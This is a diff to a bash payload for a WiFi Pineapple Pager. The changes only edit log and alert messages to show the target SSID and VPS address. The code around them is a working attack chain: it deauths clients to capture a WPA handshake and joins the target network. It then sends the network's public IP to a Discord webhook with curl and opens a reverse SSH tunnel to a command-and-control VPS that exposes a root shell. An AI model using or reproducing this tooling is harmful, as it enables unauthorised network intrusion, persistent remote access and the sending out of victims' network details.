@@ -24,7 +24,7 @@ STOP_SPINNER "${spinner1}"
 
 # If network lock/log channel to target MAC, else exit:
 if [ -n "$TARGETMAC" ]; then
-    LOG green "Target network found!"
+    LOG green "Target network $TARGETSSID found!"
     sleep 1.5
     LOG blue "Optomizing for handshake capture.."
     sleep 1.5
@@ -35,7 +35,7 @@ if [ -n "$TARGETMAC" ]; then
     LOG blue "Waiting for handshake capture.."
     sleep 1.5
 else
-    ALERT "Target not found!"
+    ALERT "Target $TARGETSSID not found!"
     LOG red "Exiting."
     exit 0
 fi
@@ -53,7 +53,7 @@ else
     while [ -z "$PCAP" ]; do
         LOG red "Handshake not found!"
         sleep 1.5
-        spinner2=$(START_SPINNER "Deauthing re-checking..")
+        spinner2=$(START_SPINNER "Deauthing $TARGETSSID re-checking..")
         DEAUTHTARG
         sleep 60
         PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
@@ -109,7 +109,7 @@ LOG green "$MAPSSID shutdown complete!"
 sleep 1.5
 
 # Get on network:
-spinner3=$(START_SPINNER "Connecting to target network..")
+spinner3=$(START_SPINNER "Connecting to $TARGETSSID..")
     WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
     LANCONNECTED="false"
     for i in {1..12}; do
@@ -124,12 +124,12 @@ spinner3=$(START_SPINNER "Connecting to target network..")
 STOP_SPINNER "${spinner3}"
 
 if [ "$LANCONNECTED" != "true" ]; then
-    ALERT "Could not connect to the network!"
+    ALERT "Could not connect to $TARGETSSID!"
     LOG red "Exiting."
     exit 0
 fi
 
-LOG green "Connected to target network!"
+LOG green "Connected to $TARGETSSID!"
 sleep 1.5
 
 # Check for internet connectvity:
@@ -143,11 +143,11 @@ for i in {1..12}; do
     if INETCHECK; then
 	    LOG green "Internet connection available!"
         sleep 1.5
-        LOG blue "Sending target network WAN IP to Discord webhook.."
+        LOG blue "Sending target network: $TARGETSSID WAN IP to Discord webhook.."
         PIP=$(curl -s https://api.ipify.org)
         curl -H "Content-Type: application/json" \
         -X POST \
-        -d "{\"content\": \"WiFi Pineapple Pager network connected at: $PIP Checking if VPS C2 is online..\"}" \
+        -d "{\"content\": \"WiFi Pineapple Pager network connected at: $PIP Checking if VPS C2 at: $VPSIP is online..\"}" \
         "$DISCORD_WEBHOOK"
         INETCON="true"
         break
@@ -168,15 +168,15 @@ sleep 1
 PINGVPS() {
     ping -c1 "$VPSIP"
 }
-LOG blue "Checking status of VPS C2.."
+LOG blue "Checking status of VPS C2 at: $VPSIP.."
 sleep 1.5
 VPSUP="false"
 for i in {1..12}; do
     if PINGVPS; then
-        LOG green "VPS C2 online!"
+        LOG green "VPS C2 at: $VPSIP is online!"
         curl -H "Content-Type: application/json" \
         -X POST \
-        -d "{\"content\": \"VPS C2 is online! Attempting to establish reverse SSH tunnel..\"}" \
+        -d "{\"content\": \"VPS C2 at: $VPSIP is online! Attempting to establish reverse SSH tunnel..\"}" \
         "$DISCORD_WEBHOOK"
         VPSUP="true"
         break
@@ -186,11 +186,11 @@ for i in {1..12}; do
 done
 
 if [ "$VPSUP" != "true" ]; then
-    ALERT "Cannot reach VPS C2!"
+    ALERT "Cannot reach VPS C2 at: $VPSIP!"
     LOG red "Exiting."
     curl -H "Content-Type: application/json" \
     -X POST \
-    -d "{\"content\": \"VPS C2 not online! Exiting.\"}" \
+    -d "{\"content\": \"VPS C2 at: $VPSIP is not online! Exiting.\"}" \
     "$DISCORD_WEBHOOK"
     exit 0
 fi
@@ -212,7 +212,7 @@ spinner4=$(START_SPINNER "Establishing SSH tunnel..")
         if TUNNELCHECK; then
             curl -H "Content-Type: application/json" \
             -X POST \
-            -d "{\"content\": \"Reverse SSH tunnel established! Access WiFi Pineapple Pager root shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
+            -d "{\"content\": \"Reverse SSH tunnel established! Access WiFi Pineapple Pager root shell at VPS C2: $VPSIP via: ssh -p 2222 root@127.0.0.1\"}" \
             "$DISCORD_WEBHOOK"
             TUNCHK="true"
             break
@@ -225,7 +225,7 @@ spinner4=$(START_SPINNER "Establishing SSH tunnel..")
 STOP_SPINNER "${spinner4}"
 
 if [ "$TUNCHK" != "true" ]; then
-    ALERT "VPS tunnel could not be established!"
+    ALERT "Reverse SSH tunnel could not be established!"
     LOG red "Exiting."
     curl -H "Content-Type: application/json" \
     -X POST \
